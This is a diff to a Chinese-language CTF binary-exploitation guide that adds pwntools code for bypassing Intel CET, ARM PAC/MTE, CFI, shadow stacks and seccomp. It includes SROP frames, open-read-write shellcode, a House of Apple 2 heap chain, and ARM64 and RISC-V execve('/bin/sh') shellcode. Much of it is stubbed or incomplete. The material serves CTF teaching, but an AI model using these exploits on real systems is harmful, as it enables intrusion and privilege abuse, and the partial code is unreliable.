@@ -259,57 +259,418 @@ payload += p64(gadget2)
 
 ## 2024-2026 新技术点
 
-### 1. 硬件级防护
+### 1. 硬件级防护实战绕过
 
 ```python
-# Intel CET
-# ARM PAC/BTI
-# ARM MTE
-# 这些防护增加了利用难度
-# 需要新的绕过方法
+# Intel CET / ARM PAC+BTI / ARM MTE 的实际绕过方法
+
+from pwn import *
+
+context.arch = 'amd64'
+
+# === Intel CET 实战绕过 ===
+def bypass_intel_cet(p, elf, libc):
+    """
+    Intel CET 包含：
+    1. IBT (Indirect Branch Tracking)：间接跳转必须到 ENDBR64
+    2. Shadow Stack (SS)：硬件维护返回地址副本
+    
+    绕过 IBT：
+    - 找到带 ENDBR64 的 gadget
+    - 利用 __libc_csu_init 中的 gadget（有 ENDBR64）
+    
+    绕过 Shadow Stack：
+    - 不使用 ret 控制流
+    - 使用 sigreturn (SROP)
+    - 使用 setjmp/longjmp
+    - 利用信号处理机制
+    """
+    
+    # 方法 1：SROP 绕过影子栈
+    frame = SigreturnFrame()
+    frame.rax = 59           # execve
+    frame.rdi = binsh_addr
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall_addr
+    frame.rsp = stack_addr
+    
+    payload = b'A' * offset
+    payload += p64(sigreturn_addr)  # 不通过 ret，直接调用 sigreturn
+    payload += bytes(frame)
+    
+    # 方法 2：利用 setcontext/swapcontext
+    # 这些函数从内存中恢复寄存器（包括 RIP）
+    # 不经过影子栈检查
+    
+    return payload
+
+# === ARM MTE 实战绕过 ===
+def bypass_arm_mte(p, malloc, free, edit):
+    """
+    ARM MTE (Memory Tagging Extension)：
+    - 4-bit tag 存储在指针高位 (bit 56-59)
+    - 每 16 字节有一个 tag
+    - 访问时检查 tag 是否匹配
+    
+    绕过方法：
+    1. Tag spraying：大量分配使 tag 重复
+    2. 时序攻击：精确控制 free/alloc 的时序
+    3. sync vs async：async MTE 有更大的利用窗口
+    """
+    
+    # Tag spraying 示例
+    # 分配大量 chunk，等待某个 tag 重复
+    # 然后通过 UAF 访问 tag 匹配的 chunk
+    
+    # partial pointer overwrite：
+    # 只覆盖指针的低位字节，保留 tag 位
+    # 例如：修改 fd 指针的 bit 0-7，不修改 bit 56-59
+    
+    pass
+
+# === ARM PAC 实战绕过 ===
+def bypass_arm_pac(p, elf):
+    """
+    ARM PAC (Pointer Authentication Code)：
+    - 指针高位编码认证码
+    - PACIA/PACDA：签名
+    - AUTIA/AUTDA：验证
+    
+    绕过方法：
+    1. PAC oracle：通过侧信道猜测 PAC 值
+    2. 部分覆盖：保留 PAC 位
+    3. 合法指针复用：从内存读取已签名指针
+    4. 编程缺陷：某些场景下 PAC 可被绕过
+    """
+    
+    # 利用已签名的函数指针
+    # 从 GOT/PLT 或 vtable 中读取已签名的指针
+    # 直接使用（不需要重新签名）
+    
+    pass
 ```
 
-### 2. CFI 绕过
+### 2. CFI 绕过实战
 
 ```python
-# Clang CFI
-# GCC CET
-# 数据导向攻击（DOP）
-# 利用合法的间接调用
+# Clang CFI / GCC CET 的实际绕过方法
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def bypass_cfi_dop(p, elf, libc):
+    """
+    CFI (Control Flow Integrity) 绕过：
+    - DOP (Data-Oriented Programming)：不修改控制流，只修改数据
+    - 利用程序已有的间接调用
+    - 通过修改数据影响程序行为
+    """
+    
+    # DOP 示例：利用 printf 的格式化字符串
+    # printf 内部有间接调用（handler lookup）
+    # 通过控制格式化字符串影响 handler 选择
+    
+    # DOP 示例：利用 qsort 的比较函数
+    # qsort 通过函数指针比较元素
+    # 如果可以修改比较函数指针，可以执行任意代码
+    
+    # CFI 绕过实用技巧：
+    # 1. __libc_csu_init 的 gadget 通常有合法的间接调用
+    # 2. vtable 中的函数是合法的间接调用目标
+    # 3. 利用 C++ 虚函数表（在 CFI 的白名单中）
+    
+    pass
+
+def bypass_shadow_stack(p, elf):
+    """
+    Shadow Stack 绕过：
+    - 返回地址被复制到影子栈
+    - ret 时比较两个返回地址
+    """
+    
+    # 绕过方法 1：SROP
+    # 使用 sigreturn 系统调用
+    # 从普通栈恢复所有寄存器（包括 RIP）
+    # 不经过 ret 指令，影子栈不检查
+    
+    frame = SigreturnFrame()
+    frame.rax = 59
+    frame.rdi = binsh_addr
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall_addr
+    
+    # 绕过方法 2：setcontext
+    # setcontext 从 ucontext 恢复寄存器
+    # 可以控制 RIP 而不经过 ret
+    
+    # 绕过方法 3：longjmp
+    # longjmp 恢复 jmp_buf 中的寄存器
+    # 但 jmp_buf 可能也受保护
+    
+    pass
 ```
 
-### 3. 沙箱绕过
+### 3. 沙箱绕过实战
 
 ```python
-# seccomp
-# 通过 ORW (open/read/write) 绕过
-# 通过侧信道绕过
-# 通过内核漏洞绕过
+# seccomp 的高级绕过技术
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def advanced_seccomp_bypass(p, libc_base):
+    """
+    seccomp 高级绕过：
+    - ORW (Open/Read/Write)：最常用
+    - 侧信道绕过：通过 timing 或 error 信息
+    - 内核漏洞绕过：利用内核漏洞逃离沙箱
+    - 信号处理绕过：利用 seccomp 的信号机制
+    """
+    
+    # === 完整 ORW Shellcode ===
+    orw_shellcode = asm(f'''
+        /* open("flag", O_RDONLY) */
+        push 0x67616c66       /* "flag" */
+        mov rdi, rsp          /* filename */
+        xor esi, esi          /* O_RDONLY */
+        mov al, 2             /* sys_open */
+        syscall
+        
+        /* read(fd, buf, 0x100) */
+        mov rdi, rax          /* fd */
+        mov rsi, rsp          /* buf */
+        xor edx, edx
+        mov dl, 0x40          /* count */
+        xor eax, eax          /* sys_read */
+        syscall
+        
+        /* write(1, buf, len) */
+        mov edx, eax          /* count */
+        mov dil, 1            /* stdout */
+        mov al, 1             /* sys_write */
+        syscall
+    ''')
+    
+    # === 多文件 ORW ===
+    multi_file_orw = asm(f'''
+        /* open(flag1) -> read -> write */
+        push 0x3167616c66     /* "flag1" */
+        mov rdi, rsp
+        xor esi, esi
+        mov al, 2
+        syscall
+        mov rdi, rax
+        mov rsi, rsp
+        add rsi, 0x100
+        mov dl, 0x40
+        xor eax, eax
+        syscall
+        mov edx, eax
+        mov dil, 1
+        mov al, 1
+        syscall
+    ''')
+    
+    # === 侧信道绕过 ===
+    # 如果 seccomp 返回 SECCOMP_RET_TRACE
+    # 可以通过 ptrace 与父进程通信
+    
+    # 如果 seccomp 允许 write 但不允许 read flag
+    # 可以通过错误信息泄露
+    
+    return orw_shellcode
 ```
 
-### 4. 新型利用链
+### 4. 新型利用链实战 (2024-2026)
 
 ```python
-# House of Apple/Banana/Cat
-# 新的 IO_FILE 利用
-# exit_funcs 利用
-# TLS 劫持
+# 2024-2026 年 CTF 中的新型利用链实战
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def chain_apple2_tcache(p, elf, libc):
+    """
+    链 1：tcache poisoning + House of Apple 2
+    适用：glibc 2.34+, Full RELRO, NX, Canary
+    """
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    def show(idx):
+        p.sendlineafter(b'>', b'4')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    # 信息泄露
+    malloc(0x400); malloc(0x20)
+    free(0); show(0)
+    fd = u64(p.recv(6).ljust(8, b'\x00'))
+    libc_base = fd - (libc.symbols['main_arena'] + 96)
+    
+    # tcache poisoning
+    malloc(0x20); malloc(0x20)
+    free(0); free(1)
+    # ... 修改 fd，分配到 _IO_list_all
+    # ... 构造 fake IO_FILE
+    # ... 触发 exit
+    
+    p.interactive()
+
+def chain_largebin_cat(p, elf, libc):
+    """
+    链 2：largebin attack + House of Cat
+    适用：glibc 2.35+, seccomp
+    """
+    # largebin attack 修改 _IO_list_all
+    # 构造 fake IO_FILE
+    # ORW shellcode
+    pass
+
+def chain_unsorted_bin_orange(p, elf, libc):
+    """
+    链 3：unsorted bin attack + House of Orange
+    适用：glibc < 2.34, 无 free 函数
+    """
+    # 溢出 top chunk
+    # unsorted bin attack
+    # 构造 fake IO_FILE
+    pass
 ```
 
-### 5. ARM64/RISC-V
+### 5. ARM64/RISC-V 利用实战
 
 ```python
-# 非 x86 架构
-# 新的保护机制
-# 新的利用方法
+# 非 x86 架构的实际利用
+
+from pwn import *
+
+# === ARM64 利用实战 ===
+def arm64_exploit(p, elf, libc):
+    """ARM64 平台的完整利用"""
+    context.arch = 'aarch64'
+    
+    # ARM64 寄存器：
+    # x0-x7: 参数传递 / 返回值
+    # x8: 间接结果寄存器
+    # x9-x15: 临时寄存器
+    # x16-x17: IP0/IP1 (链接器用)
+    # x18: 平台保留 (Shadow Call Stack)
+    # x19-x28: callee-saved
+    # x29: FP (帧指针)
+    # x30: LR (返回地址)
+    
+    # ARM64 syscall：
+    # x8 = syscall number
+    # x0-x5 = arguments
+    # svc #0 触发
+    
+    # execve shellcode
+    shellcode = asm(f'''
+        /* execve("/bin/sh", NULL, NULL) */
+        mov x8, #221           /* __NR_execve */
+        adrp x0, binsh_page
+        add x0, x0, binsh_off
+        mov x1, #0
+        mov x2, #0
+        svc #0
+        binsh_page:
+        .ascii "/bin/sh\\0"
+    ''')
+    
+    return shellcode
+
+# === RISC-V 利用实战 ===
+def riscv_exploit(p, elf):
+    """RISC-V 平台的完整利用"""
+    context.arch = 'riscv64'
+    
+    # RISC-V 寄存器：
+    # x0 (zero): 常量 0
+    # x1 (ra): 返回地址
+    # x2 (sp): 栈指针
+    # x3 (gp): 全局指针
+    # x4 (tp): 线程指针
+    # x5-x7 (t0-t2): 临时
+    # x8 (s0/fp): 帧指针
+    # x9 (s1): callee-saved
+    # x10-x11 (a0-a1): 参数 / 返回值
+    # x12-x17 (a2-a7): 参数
+    # x18-x27 (s2-s11): callee-saved
+    # x28-x31 (t3-t6): 临时
+    
+    # ecall 触发系统调用
+    # a7 = syscall number
+    # a0-a5 = arguments
+    
+    # execve shellcode
+    shellcode = asm(f'''
+        /* execve("/bin/sh", NULL, NULL) */
+        li a7, 221           /* __NR_execve */
+        la a0, binsh
+        li a1, 0
+        li a2, 0
+        ecall
+        binsh:
+        .asciz "/bin/sh"
+    ''')
+    
+    return shellcode
 ```
 
-### 6. WASM
+### 6. WASM 利用入门
 
 ```python
-# WebAssembly
-# 新的保护机制
-# 新的利用方法
+# WebAssembly 安全研究入门
+
+def wasm_exploitation_basics():
+    """
+    WASM (WebAssembly) 安全研究：
+    
+    1. WASM 内存模型：
+       - 线性内存，字节可寻址
+       - 可以从 JavaScript 访问
+       - 无 ASLR（内存布局固定）
+    
+    2. 常见漏洞：
+       - 整数溢出
+       - 缓冲区溢出（通过 memory.grow）
+       - 类型混淆
+    
+    3. 利用技术：
+       - 控制函数指针表（table）
+       - 覆盖内存中的数据
+       - 利用 import/export 机制
+    
+    4. 沙箱逃逸：
+       - WASM 运行在浏览器沙箱中
+       - 通过 JavaScript bridge 逃逸
+       - 利用浏览器漏洞
+    """
+    
+    # WASM 二进制格式分析
+    # 使用 wasm-objdump / wasm2wat
+    
+    # 常见攻击面：
+    # 1. WASM <-> JavaScript 边界
+    # 2. WASM 内存访问越界
+    # 3. WASM 函数指针表
+    
+    pass
 ```
 
 ## 工具推荐
